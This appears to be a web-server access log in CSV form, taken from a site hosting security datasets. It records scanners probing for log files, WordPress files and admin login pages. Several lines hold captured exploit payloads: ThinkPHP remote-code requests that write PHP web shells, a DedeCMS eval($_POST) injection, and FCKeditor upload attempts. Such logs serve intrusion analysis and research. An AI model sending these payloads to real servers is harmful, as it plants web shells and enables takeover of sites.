46,1,404,0,GET /apple-touch-icon-precomposed.png HTTP/1.1
34,1,404,0,GET /apple-touch-icon.png HTTP/1.1
26,1,200,1,GET /?C=N%3BO%3DD HTTP/1.1
34,1,404,0,GET /error.log.2020-01-17 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-18 HTTP/1.1
34,1,404,0,GET /error.log.2019-12-22 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-01 HTTP/1.1
35,1,404,0,GET /access.log.2019-07-15 HTTP/1.1
34,1,404,0,GET /error.log.2020-04-19 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-27 HTTP/1.1
26,1,200,1,GET /?C=D%3BO%3DA HTTP/1.1
34,1,404,0,GET /error.log.2020-03-20 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-06 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-07 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-11 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-02 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-10 HTTP/1.1
34,1,404,0,GET /error.log.2020-04-06 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-01 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-05 HTTP/1.1
34,1,404,0,GET /error.log.2020-04-21 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-05 HTTP/1.1
34,1,404,0,GET /error.log.2019-08-08 HTTP/1.1
34,1,404,0,GET /error.log.2019-12-08 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-25 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-27 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-19 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-30 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-04 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-29 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-17 HTTP/1.1
34,1,404,0,GET /error.log.2020-04-01 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-31 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-22 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-15 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-25 HTTP/1.1
34,1,404,0,GET /error.log.2020-04-22 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-01 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-24 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-01 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-26 HTTP/1.1
34,1,404,0,GET /error.log.2020-04-18 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-22 HTTP/1.1
34,1,404,0,GET /error.log.2020-04-03 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-18 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-07 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-31 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-10 HTTP/1.1
34,1,404,0,GET /error.log.2019-09-13 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-13 HTTP/1.1
35,1,200,0,GET /maccdc2012/ssh.log.gz HTTP/1.1
34,1,404,0,GET /error.log.2020-05-12 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-29 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-06 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-08 HTTP/1.1
34,1,404,0,GET /error.log.2019-10-22 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-02 HTTP/1.1
34,1,404,0,GET /error.log.2019-12-24 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-23 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-14 HTTP/1.1
34,1,404,0,GET /error.log.2020-04-27 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-27 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-23 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-20 HTTP/1.1
26,1,200,1,GET /?C=S%3BO%3DA HTTP/1.1
34,1,404,0,GET /error.log.2020-03-28 HTTP/1.1
34,1,404,0,GET /error.log.2019-07-15 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-09 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-30 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-15 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-17 HTTP/1.1
26,1,200,1,GET /?C=M%3BO%3DA HTTP/1.1
34,1,404,0,GET /error.log.2020-01-20 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-07 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-16 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-04 HTTP/1.1
34,1,404,0,GET /error.log.2020-02-28 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-06 HTTP/1.1
34,1,404,0,GET /error.log.2020-03-03 HTTP/1.1
34,1,404,0,GET /error.log.2020-05-14 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-10 HTTP/1.1
19,1,404,0,GET /2016/ HTTP/1.1
34,1,404,0,GET /error.log.2020-04-20 HTTP/1.1
34,1,404,0,GET /error.log.2020-01-03 HTTP/1.1
19,1,404,0,GET /2015/ HTTP/1.1
34,1,404,0,GET /error.log.2019-10-07 HTTP/1.1
34,1,404,0,GET /error.log.2019-10-13 HTTP/1.1
34,1,404,0,GET /error.log.2019-08-09 HTTP/1.1
62,1,304,0,GET /Datasets%20Description/HTML_Bro_log_1/files.html HTTP/1.1
61,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/conn.html HTTP/1.1
32,1,200,0,GET /self.logs/?C=M;O=A HTTP/1.1
14,1,200,0,GET / HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2017-01-01.gz HTTP/1.1
17,1,404,0,GET /%22 HTTP/1.1
31,1,404,0,GET /adminer/index.php HTTP/1.1
29,1,200,0,GET /?page=PcapFiles HTTP/1.1
31,1,404,0,GET /e/data/js/ajax.js HTTP/1.1
47,1,304,0,GET /self.logs/error.log.2019-04-23.gz HTTP/1.1
24,1,200,0,GET /robots.txt HTTP/1.0
50,1,404,0,POST /include/dialog/select_soft_post.php HTTP/1.1
38,1,404,0,GET /public/static/.gitignore HTTP/1.1
55,1,404,0,GET /public/simpleboot/css/simplebootadmin.css HTTP/1.1
34,1,404,0,GET /statics/css/crop.css HTTP/1.1
27,1,404,0,GET /css/album.css HTTP/1.1
23,1,404,1,GET /xxsssseee HTTP/1.1
22,1,404,0,GET /wangdefa HTTP/1.1
35,1,304,0,GET /maccdc2012/ssl.log.gz HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_2/ftp.html HTTP/1.1
26,1,301,0,HEAD /license.txt HTTP/1.1
63,1,200,0,GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.0
48,1,304,0,GET /self.logs/access.log.2017-01-26.gz HTTP/1.1
52,1,200,0,GET /Datasets%20Description/HTML_Bro_log_2/ HTTP/1.1
55,1,200,0,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1
42,1,404,0,GET //wp-includes/wlwmanifest.xml HTTP/1.1
29,1,404,0,GET //xmlrpc.php?rsd HTTP/1.1
47,1,404,0,GET //blog/wp-includes/wlwmanifest.xml HTTP/1.1
46,1,404,0,GET //web/wp-includes/wlwmanifest.xml HTTP/1.1
52,1,404,0,GET //wordpress/wp-includes/wlwmanifest.xml HTTP/1.1
50,1,404,0,GET //website/wp-includes/wlwmanifest.xml HTTP/1.1
45,1,404,0,GET //wp/wp-includes/wlwmanifest.xml HTTP/1.1
47,1,404,0,GET //news/wp-includes/wlwmanifest.xml HTTP/1.1
47,1,404,0,GET //2018/wp-includes/wlwmanifest.xml HTTP/1.1
47,1,404,0,GET //2019/wp-includes/wlwmanifest.xml HTTP/1.1
47,1,404,0,GET //shop/wp-includes/wlwmanifest.xml HTTP/1.1
46,1,404,0,GET //wp1/wp-includes/wlwmanifest.xml HTTP/1.1
47,1,404,0,GET //test/wp-includes/wlwmanifest.xml HTTP/1.1
48,1,404,0,GET //media/wp-includes/wlwmanifest.xml HTTP/1.1
46,1,404,0,GET //wp2/wp-includes/wlwmanifest.xml HTTP/1.1
47,1,404,0,GET //site/wp-includes/wlwmanifest.xml HTTP/1.1
46,1,404,0,GET //cms/wp-includes/wlwmanifest.xml HTTP/1.1
47,1,404,0,GET //sito/wp-includes/wlwmanifest.xml HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-05-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-05-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-05-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-05-16.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2020-05-17.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2020-05-18.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2020-05-19.gz HTTP/1.1
33,1,200,0,GET /squid/access.log.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-10-07.gz HTTP/1.1
47,1,200,1,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1
119,3,404,0,POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1
60,4,404,0,GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
58,1,404,0,POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1
27,1,404,0,GET /plus/moon.php HTTP/1.1
29,1,404,0,POST /plus/90sec.php HTTP/1.1
66,2,404,0,POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1
50,1,404,0,POST /utility/convert/data/config.inc.php HTTP/1.1
131,3,404,1,GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1
56,1,404,0,POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1
46,1,404,0,POST /index.php/api/Uploadify/preview HTTP/1.1
32,1,404,0,GET /user.php?act=login HTTP/1.1
23,1,404,0,POST /fdgq.php HTTP/1.1
160,3,200,1,GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=opkjj.php&content=%3C?php%20mb_ereg_replace('.*'_@$_REQUEST%5B_%5D_%20''_%20'e');?%3E HTTP/1.1
24,1,404,0,POST /opkjj.php HTTP/1.1
24,1,404,0,POST /ysyqq.php HTTP/1.1
228,5,200,1,GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=zujnm.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*'_@$_REQUEST%5B_%5D_%20''_%20'e');?%3E$ HTTP/1.1
24,1,404,0,POST /zujnm.php HTTP/1.1
48,1,304,0,GET /self.logs/access.log.2017-03-06.gz HTTP/1.1
32,1,404,0,HEAD /dedecms/login.php HTTP/1.1
30,1,404,0,HEAD /dede1/login.php HTTP/1.1
31,1,404,0,HEAD /admins/login.php HTTP/1.1
31,1,404,0,HEAD /houtai/login.php HTTP/1.1
32,1,404,0,HEAD /htadmin/login.php HTTP/1.1
32,1,404,0,HEAD /dede_ht/login.php HTTP/1.1
30,1,404,0,HEAD /admin/login.php HTTP/1.1
29,1,404,0,HEAD /dede/login.php HTTP/1.1
33,1,404,0,HEAD /webadmin/login.php HTTP/1.1
34,1,404,0,HEAD /admindede/login.php HTTP/1.1
31,1,404,0,HEAD /manage/login.php HTTP/1.1
33,1,404,0,HEAD /admin123/login.php HTTP/1.1
31,1,404,0,HEAD /guanli/login.php HTTP/1.1
32,1,404,0,HEAD /manager/login.php HTTP/1.1
36,1,404,0,HEAD /dede_houtai/login.php HTTP/1.1
35,1,404,0,HEAD /adminlogin/login.php HTTP/1.1
27,1,404,0,HEAD /admindede888 HTTP/1.1
30,1,404,0,HEAD /dede2/login.php HTTP/1.1
33,1,404,0,HEAD /haian360/login.php HTTP/1.1
43,1,200,0,GET /misc/zeus_dga_domains.txt.zip HTTP/1.1
48,1,301,0,GET /self.logs/access.log.2017-07-07.gz HTTP/1.1
20,1,200,0,GET /squid/ HTTP/1.1
29,1,404,0,GET /Html/upload.asp HTTP/1.1
